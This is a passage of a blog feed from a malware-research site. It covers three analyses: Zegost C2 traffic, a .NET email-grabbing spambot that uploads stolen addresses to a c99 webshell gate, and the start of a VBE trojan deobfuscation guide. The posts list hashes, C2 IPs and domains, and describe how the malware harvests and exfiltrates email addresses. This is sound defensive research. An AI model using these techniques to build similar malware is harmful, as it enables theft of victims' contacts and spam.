class=\"brush: asm\"\u003E{\"dma_code\":\"0\"\u003Cbr \/\u003E\"ip\":\"210.92.18.118\"\u003Cbr \/\u003E\"latitude\":37.57\u003Cbr \/\u003E\"longitude\":126.98\u003Cbr \/\u003E\"country_code\":\"KR\"\u003Cbr \/\u003E\"offset\":\"9\"\u003Cbr \/\u003E\"continent_code\":\"AS\"\u003Cbr \/\u003E\"country\":\"Korea Republic of\"\u003Cbr \/\u003E\"asn\":\"AS4766\"\u003Cbr \/\u003E\"isp\":\"Korea Telecom\"\u003Cbr \/\u003E\"timezone\":\"Asia\\\/Seoul\"\u003Cbr \/\u003E\"area_code\":\"0\"\u003Cbr \/\u003E\"country_code\":\"KOR\/KR\"}\u003C\/pre\u003E \u003Cp\u003EShortly, that IP address \u003Cb\u003E210.92.18.118 (port 8086)\u003C\/b\u003E is the only IP communicated with the malware via hostname: \u003Cb\u003Eqi89.f3322.org\u003C\/b\u003E. Law enforcement may prefer to have this PCAP traffic as PoC\/evidence. The callback traffic was replied by the CNC and was sent in encrypted form as per recorded in traffic below, I am sorry, I didn't have energy to crack this further..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2gecdcdDxmg\/VesZwvW_5UI\/AAAAAAAATIk\/1NCzxHycURc\/s4120\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2gecdcdDxmg\/VesZwvW_5UI\/AAAAAAAATIk\/1NCzxHycURc\/s580\/004.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003E..and get the ID :-)\u003C\/h2\u003E \u003Cp\u003ESo..I have collected the first three (3) DGA generated basis domains from malware sample which are: \u003Cpre class=\"brush: asm\"\u003E360.cn\u003Cbr \/\u003E'f3322.org'\u003Cbr \/\u003Eqh-lb.com\u003C\/pre\u003Ebut the #1 and #3 are legit services.  \u003Cp\u003EThere is \u003Cb\u003Eonly one domain that is really being used as CNC\u003C\/b\u003E (see the PCAP), the other domains are just being used as decoys to confuse the investigation. And \u003Cb\u003Ethe real CNC hostname is\u003C\/b\u003E : \u003Cpre class=\"brush: asm\"\u003E\"f3322.org\" w\/Registrant email: \"ppyy@astpbx.com\"\u003C\/pre\u003ESo now we learn more about the nature of Zegost in generating DGA and faking CNC domains.  \u003Cp\u003EMalware is served under domain \u003Cb\u003Ef3322.org\u003C\/b\u003E which is having a super bad reputation in being used by Mr.Black ELF attacks and many more ELF attacks, for example: \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E attacker was \u003Ca href=\"http:\/\/t.co\/xRvhDugAz4\"\u003Ehttp:\/\/t.co\/xRvhDugAz4\u003C\/a\u003E (222.186.34.220), posted details I have at \u003Ca href=\"http:\/\/t.co\/AjZj2eay0z\"\u003Ehttp:\/\/t.co\/AjZj2eay0z\u003C\/a\u003E\u0026#10;Hope it’s useful.\u003C\/p\u003E\u0026mdash; jquinby (@jquinby) \u003Ca href=\"https:\/\/twitter.com\/jquinby\/status\/639872663779995648\"\u003E2015, 9月 4\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThanks to reddit folks to inform that the \u003Cb\u003Ef3322.org\u003C\/b\u003E is a part of a Chinese dynamic hostname\/DNS (DDNS) service provider. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-O7hKr-ybDKA\/VexHhJSdCVI\/AAAAAAAATJY\/sZIfE-wTrvI\/s3400\/3Untitled.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-O7hKr-ybDKA\/VexHhJSdCVI\/AAAAAAAATJY\/sZIfE-wTrvI\/s500\/3Untitled.png\u003E\u003C\/a\u003E\u003Cbr\u003EWe didn't know this detail until now. So it looks like that their services is used by the malware activities. It means the actor can be traced via contacting the \u003Cb\u003Ef3322.org\u003C\/b\u003E abuse accordingly. We're on it for we have long list of malicious subdomains used now.  \u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/8873961162950788058\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/09\/mmd-0042-2015-hunting-mr-black-ids-via.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/8873961162950788058"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/8873961162950788058"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/09\/mmd-0042-2015-hunting-mr-black-ids-via.html","title":"MMD-0042-2015 - Hunting Mr. Black IDs via Zegost cracking"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-XPnBjja6GJg\/VesZv1t-U4I\/AAAAAAAATIM\/GEBzQuL5iOk\/s72-c\/000.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-5420497188116495952"},"published":{"$t":"2015-09-03T01:33:00.003-07:00"},"updated":{"$t":"2015-11-15T21:57:22.945-08:00"},"title":{"type":"text","$t":"MMD-0041-2015 - Reversing PE Mail-Grabber Spambot \u0026 its C99 WebShell Gate"},"content":{"type":"html","$t":"I don't know about the origin of the infection, but when I talked with Mr. Christopher Lowson while examining the CNC of the threat, I guessed a PC was infected with this malware and the callback is why me and Mr. Lawson talked. Beforehand, thank's to the Emerging Threat to allow me to write  this up, I will start this report from the malware analysis to its CNC gates, in as secure manner as possible.  \u003Cp\u003E\u003Ch2\u003EThe unknown SFX RAR .Net PE malware (sounds lame enough?)\u003C\/h2\u003E \u003Cp\u003EThe sample is a PE (6222e15ed2c71429c472e5f0fa40d727) and it was reported a week ago (2015-08-27 15:10:48 UTC). A grep info in \u003Cb\u003Epescanner\u003C\/b\u003E will show you: \u003Cpre class=\"brush: asm\"\u003EFile:    .\/Release.exe\u003Cbr \/\u003ESize:    263514 bytes\u003Cbr \/\u003EType:    PE32 executable (GUI) Intel 80386, for MS Windows\u003Cbr \/\u003EMD5:     6222e15ed2c71429c472e5f0fa40d727\u003Cbr \/\u003ESHA1:    a9316503ad6dd9e10fa8506fe69cc5aa7cc4eafe\u003Cbr \/\u003EDate:    0x54E0521F [Sun Feb 15 08:00:31 2015 UTC]\u003Cbr \/\u003EEP:      0x41d7cb .text 0\/4\u003Cbr \/\u003ECRC:     Claimed: 0x0, Actual: 0x4a8a2 [SUSPICIOUS]\u003C\/pre\u003E \u003Cp\u003EThe CRC differences is showing packed\/archives or both, I tend to check further the insides for sure with my beloved UNIX shell reversing tool, the almighty \u003Cb\u003Eradare\u003C\/b\u003E:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QVNW8s4Krwo\/Vef3U1fTPgI\/AAAAAAAATDI\/rpKRdq3PM7E\/s2512-Ic42\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QVNW8s4Krwo\/Vef3U1fTPgI\/AAAAAAAATDI\/rpKRdq3PM7E\/s500-Ic42\/004.png\u003E\u003C\/a\u003E\u003Cbr\u003E..this is showing overlay of \u003Ci\u003ESFX Rar file\u003C\/i\u003E. A test (t command) in \u003Cb\u003Eunrar\u003C\/b\u003E shows the contents safely: \u003Cpre class=\"brush: asm\"\u003ETesting     MAPIEx.dll                            OK\u003Cbr \/\u003ETesting     NetMAPI.dll                           OK\u003Cbr \/\u003ETesting     aa.exe                                OK\u003Cbr \/\u003E\u003C\/pre\u003EOh, it seems there are two run time dll to run the \u003Ci\u003Eaa.exe\u003C\/i\u003E, Let's check again what is the aa.exe: \u003Cpre class=\"brush: asm\"\u003EMD5 (aa.exe) = fa056e635791f18b21898bc0ff6a9978\u003Cbr \/\u003Eaa.exe: PE32 (GUI) Intel 80386 Mono\/\".Net assembly\", for MS Windows\u003C\/pre\u003E \u003Cp\u003EThe above result is a self explanatory. The point is: \u003Cfont color=yellow\u003E\u003Ci\u003EAlways do \u003Cb\u003Estatic analysis\u003C\/b\u003E beforehand, it is very important to recognize \u003Cb\u003Ewhich binary\u003C\/b\u003E we are dealing and how is the best way to deal with before we start firing some \u003Ci\u003Edisassemblers \u003C\/i\u003Eto check its bits or opcodes\u003C\/i\u003E.\u003C\/font\u003E\u003Cp\u003EOkay, since now we know how it's developed, let's \u003Ci\u003Edecompile \u003C\/i\u003Eit in the same way it was built. You'll find these loaded resources: \u003Cpre class=\"brush: asm\"\u003EOutlookContactsViewer.Form1.resources (Embedded, Public)\u003Cbr \/\u003EOutlookContactsViewer.Properties.Resources.resources (Embedded, Public)\u003C\/pre\u003E \u003Cp\u003EThe above resources is having the code to execute the malware, so the rest of this reversing is just depending on our skill to read that code.. I will cover the important parts only to PoC the badness of this binary and won't share the full code for the security purpose, as follows..  \u003Cp\u003E\u003Ch2\u003EPeeling the malcode :-)\u003C\/h2\u003E \u003Cp\u003EThis is how the \u003Ci\u003Emalcode \u003C\/i\u003Ewas started... by initiation some variables and starting the main function to call to its loading-form:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WC7xmnEp66c\/Vef3VK8EqtI\/AAAAAAAATDA\/-AIQx-UU-Go\/s2640-Ic42\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WC7xmnEp66c\/Vef3VK8EqtI\/AAAAAAAATDA\/-AIQx-UU-Go\/s580-Ic42\/005.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd the loaded form has the main code of main functions for overall malcode operation:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QUwqsCYC4lM\/Vef3VVvUYqI\/AAAAAAAATDg\/eXXOYKFgNwU\/s2640-Ic42\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QUwqsCYC4lM\/Vef3VVvUYqI\/AAAAAAAATDg\/eXXOYKFgNwU\/s580-Ic42\/006.png\u003E\u003C\/a\u003E\u003Cbr\u003EAs you can see it has two commands of \"extract\" and \"spread\". Between the \"===\" delimeter string, the data\/text will be filled by email addresses grabbed from functions: \u003Ci\u003EGetMailsFromContacts()\u003C\/i\u003E, \u003Ci\u003EGetMailsFromHeaders() \u003C\/i\u003Eand \u003Ci\u003EGetMailsFromMessages().\u003C\/i\u003E \u003Cp\u003EFunctions called due to the \"extract\" command is the text formulation of the strings following by the POST command to send data to the web gates with URL defined in the initialization variable part.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-zM5NoVB7_88\/Vef3VmABQsI\/AAAAAAAATDY\/t9iH54okDSw\/s3640-Ic42\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-zM5NoVB7_88\/Vef3VmABQsI\/AAAAAAAATDY\/t9iH54okDSw\/s580-Ic42\/007.png\u003E\u003C\/a\u003E \u003Cp\u003ENow we know the purpose of the runtime file is; \u003Ci\u003ENetMAPI library\u003C\/i\u003E was used to perform \u003Ci\u003Eemail-grabbing\u003C\/i\u003E act i.e. as per snipped below code in \u003Ci\u003EGetMailsFromContacts()\u003C\/i\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vCGqKMm9Txs\/Vef3Vycpo7I\/AAAAAAAATEU\/InZUaAR45FY\/s3640-Ic42\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vCGqKMm9Txs\/Vef3Vycpo7I\/AAAAAAAATEU\/InZUaAR45FY\/s580-Ic42\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003E..and it is added with the regex to grep the email addresses in \u003Ci\u003EGetMailsFromHeaders()\u003C\/i\u003E and \u003Ci\u003EGetMailsFromMessages()\u003C\/i\u003E parts:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-dJd7jXD7Wjg\/Vef3WgxoAsI\/AAAAAAAATEY\/4KCPq_Bq-rU\/s3640-Ic42\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-dJd7jXD7Wjg\/Vef3WgxoAsI\/AAAAAAAATEY\/4KCPq_Bq-rU\/s580-Ic42\/009.png\u003E\u003C\/a\u003E \u003Cp\u003EThe same library also being used to spread spam via \"spread\" command (below), yes..it is a PoC that we also have a kind of \u003Cb\u003E\u003Ci\u003Espambot\u003C\/i\u003E\u003C\/b\u003E too here. Noted that the \u003Ci\u003Esubject\u003C\/i\u003E, \u003Ci\u003Ebody message\u003C\/i\u003E and the \u003Ci\u003Eattachment \u003C\/i\u003Evariables hard coded in the initiation part was stored here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-lHAbBte5XOI\/Vef4t5SmBJI\/AAAAAAAATEw\/dTPx2nD-j_M\/s3640-Ic42\/017.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-lHAbBte5XOI\/Vef4t5SmBJI\/AAAAAAAATEw\/dTPx2nD-j_M\/s580-Ic42\/017.png\u003E\u003C\/a\u003E \u003Cp\u003EI snip some significant codes (only) that's utilizing HTTP protocol for uploading grabbed emails to the gate as per below, to understand and to figure ways to mitigate the threat further:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-BiJ5kKw5KEM\/Vef3W7y-SvI\/AAAAAAAATDs\/CQV2c8Yujp0\/s3640-Ic42\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-BiJ5kKw5KEM\/Vef3W7y-SvI\/AAAAAAAATDs\/CQV2c8Yujp0\/s580-Ic42\/010.png\u003E\u003C\/a\u003E \u003Cp\u003ETo be noted this malware reads the \u003Ci\u003Emultipart encoded part\u003C\/i\u003E of an email too:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5MHwbJDaYWs\/Vef3XYShKNI\/AAAAAAAATEI\/dhdxGHCOpXM\/s3640-Ic42\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5MHwbJDaYWs\/Vef3XYShKNI\/AAAAAAAATEI\/dhdxGHCOpXM\/s580-Ic42\/011.png\u003E\u003C\/a\u003E \u003Cp\u003EA sample traffic captured for the uploads is here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-cd5U4HFk5WM\/Vef3UYHR8EI\/AAAAAAAATDU\/N9brKZErClc\/s2640-Ic42\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-cd5U4HFk5WM\/Vef3UYHR8EI\/AAAAAAAATDU\/N9brKZErClc\/s580-Ic42\/003.png\u003E\u003Cbr\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-bgucDLV5hzI\/Vef3UgYPZbI\/AAAAAAAATC8\/tLm3JUjlL-U\/s2640-Ic42\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-bgucDLV5hzI\/Vef3UgYPZbI\/AAAAAAAATC8\/tLm3JUjlL-U\/s580-Ic42\/002.png\u003E\u003C\/a\u003E \u003Cp\u003ESo we have the good idea what the malware is doing, yes? It sends spam, it grabs email address and uploaded them to the remote gate.  \u003Cp\u003E\u003Ch2\u003EThe gate\u003C\/h2\u003E \u003Cp\u003EThe gate is a hacked sites, I spotted the \u003Cb\u003E\u003Ci\u003Ec99shell\u003C\/i\u003E\u003C\/b\u003E by the first time I see it. I spent much time studying \u003Ci\u003Ec99shell\u003C\/i\u003E before, the link is here--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2012\/10\/how-far-phpc99shell-malware-can-go-from.html\"\u003Elink\u003C\/a\u003E]. This one looks injected to the compromised web site via PHP vulnerability that allows remote file uploading. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0sXx-expOIU\/Vef3XhLYlbI\/AAAAAAAATD8\/BBBbZrKNoLo\/s4512-Ic42\/012.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0sXx-expOIU\/Vef3XhLYlbI\/AAAAAAAATD8\/BBBbZrKNoLo\/s580-Ic42\/012.png\u003E\u003C\/a\u003E \u003Cp\u003EIt is the latest standard version noticing this command list:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8aeoIwY3-Lg\/Vef3UeqlFFI\/AAAAAAAATDQ\/40Hzw5he_A0\/s3512-Ic42\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8aeoIwY3-Lg\/Vef3UeqlFFI\/AAAAAAAATDQ\/40Hzw5he_A0\/s580-Ic42\/001.png\u003E\u003C\/a\u003E \u003Cp\u003EThis is the \u003Cb\u003E\u003Ci\u003Eup.php\u003C\/i\u003E\u003C\/b\u003E gate's code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-etZ39UxX7fc\/Vef3YUAiUPI\/AAAAAAAATEk\/XLd2xMhfhlc\/s4640-Ic42\/014.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-etZ39UxX7fc\/Vef3YUAiUPI\/AAAAAAAATEk\/XLd2xMhfhlc\/s580-Ic42\/014.png\u003E\u003C\/a\u003E\u003Cbr\u003ESo this is how the up.php works in receiving the request, using \u003Cb\u003EGeoIP\u003C\/b\u003E (by \u003Ci\u003EMaxmind\u003C\/i\u003E) \u003Cb\u003EAPI\u003C\/b\u003E to check the location of POSTed IP, making directory of that \u003Cb\u003Ecountry code\u003C\/b\u003E (if not exist) and writing files with the list of grabbed emails in it (if succeeded), it explains many directories with country code names. It also make logs of access and has the ban access function too, the details for that is written in the included \u003Cb\u003Efunc.php.\u003C\/b\u003E. Please noted the \u003Ci\u003E\"Nothing to do..\"\u003C\/i\u003E decoy.  \u003Cp\u003EIt's not being used but below is snipped for the logging and banning codes, I \"secured\" it a bit:-)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-sYf9NsrUdzo\/Vef3YSn5DPI\/AAAAAAAATEg\/FYn0_mZ7WlI\/s3640-Ic42\/015.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sYf9NsrUdzo\/Vef3YSn5DPI\/AAAAAAAATEg\/FYn0_mZ7WlI\/s580-Ic42\/015.png\u003E\u003C\/a\u003E \u003Cp\u003EThis is what files were injected and created in that panel, if you see the same files in your servers please delete or secure them all + fix the PHP flaw that caused the file upload.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QvbXXhRViSM\/Vef3X3Z___I\/AAAAAAAATEA\/J10zWYSarY8\/s3444-Ic42\/013.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QvbXXhRViSM\/Vef3X3Z___I\/AAAAAAAATEA\/J10zWYSarY8\/s580-Ic42\/013.png\u003E\u003C\/a\u003E \u003Cp\u003EThe email data of the victims that has been grabbed was plenty.. thanks to Mr. Lowson to clean this threat's gate to stop this badness. Below is the snip per 4 lines each data in the CO (randomly picked) directory..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-4X7080G3Rzw\/Vef3YkoVwmI\/AAAAAAAATEc\/oZCwV2CHOwU\/s3512-Ic42\/016.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-4X7080G3Rzw\/Vef3YkoVwmI\/AAAAAAAATEc\/oZCwV2CHOwU\/s512-Ic42\/016.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EUnknown threat with zero detection\u003C\/h2\u003E \u003Cp\u003EI don't think we had any PE detection signature for this malware (in VT check): [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/df1042159dc911e0a545ccd51192b9a1eb4a6215977185cc71878fa16344af0c\/analysis\/1441231415\/\"\u003ERelease.exe\u003C\/a\u003E] [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/b6306bc7a74e7bfff3327f990bc292e4fe0735581d810b18d0abec006fdef331\/analysis\/\"\u003Eaa.exe\u003C\/a\u003E]  \u003Cp\u003EA saying in my country says: \u003Ci\u003E\u003Cb\u003E\"What we don't know, even small mater, may hurt us badly\"\u003C\/b\u003E\u003C\/i\u003E ..I guess this is the case. Don't say about \u003Cb\u003EVirusTotal \u003C\/b\u003Eresult can not represent detection in this case since several AV products installed in PC was letting infection happened without having detection either.   \u003Cp\u003ESee this case well, even a simple .NET malware using a straight new DLL abuse vector calls for malicious purpose, if it is unknown, it's just \u003Cb\u003Elethal enough\u003C\/b\u003E to damage us. So firstly \u003Cfont color=yellow\u003Eplease rely more on our own security common sense than just letting automation made by \u003Ci\u003Eindustries\u003C\/i\u003E 100% control the way we must think and act\u003C\/font\u003E, \u003Cb\u003E\u003Ci\u003EWHAT IF\u003C\/i\u003E\u003C\/b\u003E  things went wrong? \u003Cb\u003EThe risk\u003C\/b\u003E is always be in our hands as users\/victims \u003C \u003Cb\u003Ethe moral of this story.\u003C\/b\u003E \u003Cp\u003EJust another saying: \"\u003Cb\u003E\u003Ci\u003EOne who admit the FAILURE has the chance to IMPROVE. One who just making EXCUSES will NEVER improve..\u003C\/i\u003E\u003C\/b\u003E\"  \u003Cp\u003E\u003Ch2\u003EAdditionals..\u003C\/h2\u003E \u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E I confirm it\u0026#39;s spanish. Here you got a (more or less) traduction\u0026#10;\u0026#10;\u003Ca href=\"http:\/\/t.co\/5wIFenpQYZ\"\u003Ehttp:\/\/t.co\/5wIFenpQYZ\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Mr. Highway (@fbalzary) \u003Ca href=\"https:\/\/twitter.com\/fbalzary\/status\/639377422241132544\"\u003ESeptember 3, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E#MalwareMustDie"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/5420497188116495952\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/09\/mmd-0041-2015-reversing-pe-mail-grabber.html#comment-form","title":"1 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5420497188116495952"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5420497188116495952"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/09\/mmd-0041-2015-reversing-pe-mail-grabber.html","title":"MMD-0041-2015 - Reversing PE Mail-Grabber Spambot \u0026 its C99 WebShell Gate"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-QVNW8s4Krwo\/Vef3U1fTPgI\/AAAAAAAATDI\/rpKRdq3PM7E\/s72-c\/004.png","height":"72","width":"72"},"thr$total":{"$t":"1"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-7145794022713030837"},"published":{"$t":"2015-08-28T10:35:00.000-07:00"},"updated":{"$t":"2015-11-15T21:54:28.278-08:00"},"title":{"type":"text","$t":"MMD-0040-2015 - Dissecting \u0026 learning about VBE Obfuscation \u0026 AutoIt Banco Trojan"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cp\u003EMalwareMustDie (MMD) today is having the third anniversary. due to this occasion, I wrote this post as the anniversary celebration :) The point is to introduce some methodology in dissecting obfuscated script malware using the real life sample of VBE encoded case with multiple obfuscation. Why I pick this VBE is because the recent raise of the visual basic scripted malware, as in its stand alone VBE, in attached macro of Microsoft Office documents too, so hopefully this writing can share some idea to those who want to know more in how we used to dissect them in MMD. Another reason is to introduce many tools for practical malware analysis that can be performed by everyone who want to start to learn. It's not that difficult, so let's learn it together!   \u003Cp\u003EA friend was sending us a VB encoded script (with thank's), he sent me a lot of good samples and I really appreciated. The file named \"\u003Cb\u003E\u003Ci\u003EContratoAssinar.vbe\u003C\/i\u003E\u003C\/b\u003E (\u003Cb\u003E4bb9a041ab9cdd8398f95c0dd8a364b0\u003C\/b\u003E)\" and I find it very interesting, so I think I'd better to make some notes here about the way I dissolve it for others who may handle same threat.  \u003Cp\u003EThe origin of the threat is from South America (to be precise, Brazil), The file looks like coming from an attachment of malvertisement email campaign of the malware. The file name itself is quite popular, with a bit of net surfing will give you good information about the campaign of this malware.  \u003Cp\u003E\u003Ch2\u003EVBE malware script\u003C\/h2\u003E \u003Cp\u003EThe malware is encoded using the Microsoft's Scripting.Encoder program, it looks like this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-UkO-8I85Nkg\/VeCHnVFaGMI\/AAAAAAAAS8Q\/LUnTQznQu54\/s2720-Ic42\/000a.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-UkO-8I85Nkg\/VeCHnVFaGMI\/AAAAAAAAS8Q\/LUnTQznQu54\/s580-Ic42\/000a.png\u003E\u003C\/a\u003E \u003Cp\u003EI tend to use the script provided by the vendor for these purpose so I used this script--\u003E[\u003Ca href=\"https:\/\/gallery.technet.microsoft.com\/Encode-and-Decode-a-VB-a480d74c\"\u003Elink\u003C\/a\u003E] to decode it (the instruction is in that page, it is really \u003Cb\u003Ereally\u003C\/b\u003E self explanatory) and it was resulted into another partial-obfuscated script as you can see the whole data in the below image: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1onj3gsAd4Y\/VeCHoHByS-I\/AAAAAAAAS8c\/pWpM2CxPzsU\/s4512-Ic42\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1onj3gsAd4Y\/VeCHoHByS-I\/AAAAAAAAS8c\/pWpM2CxPzsU\/s580-Ic42\/004.png\u003E\u003C\/a\u003E \u003Cp\u003EYou will see some area in the above code that I separated them into colors:\u003Cbr\u003E\u003Ci\u003EThe yellow area\u003C\/i\u003E is the part where this script is to be assured to execute in the right system command \u0026 path\/file name, it was started in the first line a SUB name that execution the latest part in the overall script.   \u003Cp\u003E\u003Ci\u003EThe red part\u003C\/i\u003E is the data area where the actual malware script command for the next level is obfuscated, following \u003Cb\u003E\u003Ci\u003Ethe red arrow \u003C\/i\u003E\u003C\/b\u003Ewill lead you to the blue area of logic where the data to be final-deobfuscated in the below series of deobfuscation commands.\u003Cbr\u003E\u003Ci\u003EOrange color part\u003C\/i\u003E is the part where deobfuscated commands to be executed, and following \u003Cb\u003E\u003Ci\u003Ethe blue arrow\u003C\/i\u003E\u003C\/b\u003E can lead you to the actual malicious mysterious strings to be executed by the obfuscated malware script.  \u003Cp\u003ETo understand the flow of obfuscation in several language of programming that I faced so far in MalwareMustDie and facing to obfuscation I tend to discipline myself to follow my own committed rules as per shared below: \u003Ci\u003E\u003Cp\u003E1. Make the code to be simplified, beautified, make it easy to you to stare at (I mean..to read) \u003Cbr\u003E2. Break the codes into pieces, and comment them, make sure you know how each component works, do not be shy to make many comments, and I make tons of them too, it is for your own good.\u003Cbr\u003E3. To securely simulate the code to debug is strongly suggested. Use any compiler\/interpreter that helps, if not..use our brain for it by making some notes, in this level in most of the time in heavy obfuscated challenges we must go back to point 1. again, but so be it,do it happily!\u003Cbr\u003E4. Do not get frustrated, enjoy the cracking like you are eating ice cream, it will end before you even know it..it's all be solved in time, believe it! When you are in a rush or in some pressure your brain cells can not focus to the decoding effort fully, only when we relax we can fully use those cells, and if you push it hard, your work will not be effective and mistakes will occur. A one little mistake of a single byte will drag you to a time-consuming trouble-shooting debugging later on which will lead you back to square one..and that is mostly how a failure starts, so noted this point number 4 well, PS: this point also goes to the boss\/management of the reverse engineers, understand this point well if you want your team to do good work!\u003Cbr\u003E5. Write it, don't expect your brain to memorize every work result you do, make it searchable for yourself (or for your team..or others) to be used for later reference, be smart in documenting stuff and manageable, we are educated people not like those crooks who made these craps we decode, we're better than them.\u003C\/i\u003E \u003Cp\u003EWhat we learned from the first level decoded VBE script is: The malware coder is trying to hide the path confirmation instruction to trigger execution by SUB-ing the call for executional path in the last part of the script. He also obfuscate another malware script in the stub of variable value to be decoded again by the instruction following that stub, and after that pass the decoded value into execution.  \u003Cp\u003ETo understand this I just simply replace all of the random-look strings into a dull-like var-x or anything that can differ it to the real code token, you can choose any 